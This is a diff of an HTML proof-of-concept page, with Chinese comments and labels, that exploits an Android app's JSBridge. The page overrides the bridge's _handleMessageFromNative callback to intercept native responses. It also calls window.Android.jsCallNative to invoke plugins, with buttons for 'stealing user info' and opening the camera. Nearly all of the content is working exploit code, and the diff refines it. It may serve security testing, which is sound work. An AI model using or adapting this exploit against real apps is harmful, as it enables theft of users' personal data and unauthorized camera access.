@@ -3,21 +3,22 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>JSBridge 漏洞利用 PoC</title>
+    <title>JSBridge 漏洞利用 PoC (完美版)</title>
     <style>
         body { font-family: sans-serif; padding: 20px; max-width: 600px; }
-        button { display: block; width: 100%; padding: 12px; margin: 8px 0; font-size: 16px; cursor: pointer; background-color: #28a745; color: white; border: none; border-radius: 4px; }
-        button:hover { background-color: #218838; }
+        button { display: block; width: 100%; padding: 12px; margin: 8px 0; font-size: 16px; cursor: pointer; background-color: #007bff; color: white; border: none; border-radius: 4px; }
+        button:hover { background-color: #0056b3; }
         #log { margin-top: 20px; padding: 10px; background: #f0f0f0; border-radius: 4px; white-space: pre-wrap; font-family: monospace; }
         .success { color: #28a745; }
         .error { color: #dc3545; }
+        .info { color: #17a2b8; }
     </style>
     <script src="https://unpkg.com/vconsole@latest/dist/vconsole.min.js"></script>
 </head>
 <body>
-    <h1>🎉 JSBridge 漏洞利用 PoC</h1>
-    <button onclick="testGetUserInfo()">窃取用户信息</button>
-    <button onclick="testOpenCamera()">打开相机</button>
+    <h1>🎯 JSBridge 漏洞利用 PoC (完美版)</h1>
+    <button onclick="testGetUserInfo()">窃取用户信息 (同步)</button>
+    <button onclick="testOpenCamera()">打开相机 (异步)</button>
     <button onclick="clearLog()">清空日志</button>
     
     <div id="log">等待操作...</div>
@@ -28,7 +29,7 @@
         const logEl = document.getElementById('log');
         function log(msg, type = 'info') {
             const time = new Date().toLocaleTimeString();
-            const className = type === 'success' ? 'success' : type === 'error' ? 'error' : '';
+            const className = type === 'success' ? 'success' : type === 'error' ? 'error' : type === 'info' ? 'info' : '';
             logEl.innerHTML += `<div class="${className}">[${time}] ${msg}</div>`;
             console.log(`[${time}] ${msg}`);
         }
@@ -40,7 +41,7 @@
 
         // 【核心】定义全局回调函数，用于接收原生返回的数据
         function nativeCallback(data) {
-            log('--- nativeCallback 真正的处理函数被调用 ---');
+            log('--- nativeCallback 真正的处理函数被调用 ---', 'info');
             log(`🎉 收到数据: ${data}`, 'success');
             
             try {
@@ -57,26 +58,32 @@
             }
         }
 
-        // 【核心解决方案】创建一个“拦截者”，来接管 App 的回调
-        // 根据 BridgeUtil，App 会调用 window.WebViewJavascriptBridge._handleMessageFromNative
-        if (window.WebViewJavascriptBridge) {
-             log('⚠️ window.WebViewJavascriptBridge 已存在，正在覆盖...', 'error');
-        }
-        
-        window.WebViewJavascriptBridge = {
-            _handleMessageFromNative: function(jsonStr) {
+        // 【核心解决方案】安全地 Hook _handleMessageFromNative 方法
+        function setupInterceptor() {
+            // 确保对象存在
+            if (!window.WebViewJavascriptBridge) {
+                window.WebViewJavascriptBridge = {};
+                log('创建了 window.WebViewJavascriptBridge 对象', 'info');
+            }
+
+            // 保存原始方法（如果存在的话）
+            const originalHandler = window.WebViewJavascriptBridge._handleMessageFromNative;
+
+            // Hook 它！
+            window.WebViewJavascriptBridge._handleMessageFromNative = function(jsonStr) {
                 console.log(">>> [vConsole] _handleMessageFromNative 拦截者被触发! <<<");
                 console.log(">>> [vConsole] 收到的原始 JSON:", jsonStr);
+                console.trace(); // 打印调用栈，看看是谁调用的
 
-                log('--- _handleMessageFromNative 拦截者被触发 ---');
+                log('--- _handleMessageFromNative 拦截者被触发 ---', 'info');
                 log(`拦截到原始数据: ${jsonStr}`);
                 
                 try {
                     const message = JSON.parse(jsonStr);
-                    const callbackId = message.responseId; // 这会是 'nativeCallback'
-                    const resultData = message.responseData; // 这会是 {"code":"0", ...}
+                    const callbackId = message.responseId; 
+                    const resultData = message.responseData; 
                     
-                    log(`解析成功，cbID: ${callbackId}, 数据: ${resultData}`);
+                    log(`解析成功，cbID: ${callbackId}, 数据: ${resultData}`, 'info');
 
                     // 根据 cbID 调用我们真正的处理函数
                     if (callbackId === 'nativeCallback') {
@@ -87,8 +94,14 @@
                 } catch (e) {
                     log(`解析 JSON 失败: ${e.message}`, 'error');
                 }
-            }
-        };
+
+                // 【可选】如果我们想保留原始功能，可以调用原始方法
+                // if (originalHandler) {
+                //     originalHandler.apply(this, arguments);
+                // }
+            };
+            log('✅ 已成功 Hook _handleMessageFromNative 方法', 'success');
+        }
 
         // 【核心】使用 jsCallNative 方法进行调用
         function callPlugin(pluginName, params) {
@@ -97,7 +110,7 @@
                 return;
             }
             
-            log(`\n--- 调用插件: ${pluginName} ---`);
+            log(`\n--- 调用插件: ${pluginName} ---`, 'info');
             
             try {
                 const payload = {
@@ -106,9 +119,8 @@
                 };
                 console.log(">>> [vConsole] 准备发送 payload:", JSON.stringify(payload));
                 
-                // 第二个参数 'nativeCallback' 会被当作 cbID 传递
                 window.Android.jsCallNative(JSON.stringify(payload), 'nativeCallback');
-                log('✅ 已发起调用，等待回调...');
+                log('✅ 已发起调用，等待回调...', 'info');
             } catch (e) {
                 log(`❌ 调用失败: ${e.message}`, 'error');
             }
@@ -121,13 +133,14 @@
 
         function testOpenCamera() {
             clearLog();
+            log('注意：openCamera 是异步操作，你需要拍照或取消后才会有回调！', 'info');
             callPlugin('openCamera');
         }
         
-        // 页面加载时自动扫描
+        // 页面加载时设置拦截器
         window.onload = () => {
-            log('页面加载完成，点击按钮开始测试');
-            log('已创建 _handleMessageFromNative 拦截者，准备拦截回调...');
+            log('页面加载完成，正在设置拦截器...');
+            setupInterceptor();
         };
     </script>
 </body>
